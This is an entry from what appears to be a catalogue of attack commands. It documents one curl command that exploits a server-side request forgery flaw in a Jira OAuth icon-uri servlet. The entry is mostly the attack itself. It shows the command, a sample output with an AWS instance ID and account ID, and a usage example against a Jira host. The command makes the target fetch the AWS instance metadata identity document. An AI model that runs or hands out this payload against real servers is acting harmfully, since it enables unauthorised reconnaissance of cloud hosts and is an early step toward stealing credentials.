---
data: >-
  curl
  "https://target-domain/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/dynamic/instance-identity/document"
tags:
  - ssrf
  - aws
  - json
type: command
output: '{"instanceId": "i-63914e47", "accountId": "993671966739", ...}'
executor: bash
platforms:
  - Linux
  - AWS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:55.292Z'
id: 24798767-09ff-4f5b-819f-3a24e7a1a00a
verified: false
validated: true
submitted: true
---
# curl-ssrf-instance-document

## Command

```bash
curl "https://target-domain/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/dynamic/instance-identity/document"
```

## Description

Fetches the AWS instance identity document in JSON format via SSRF.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `target-domain` | Vulnerable app domain | Yes |

## Examples

### Basic Usage

```bash
curl "https://jira.dod.example/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/dynamic/instance-identity/document"
```

## Expected Output

JSON object with privateIp, instanceId, accountId, region, etc.

## Related

- [[Related Procedure: Retrieve-AWS-Instance-Metadata-via-SSRF]]
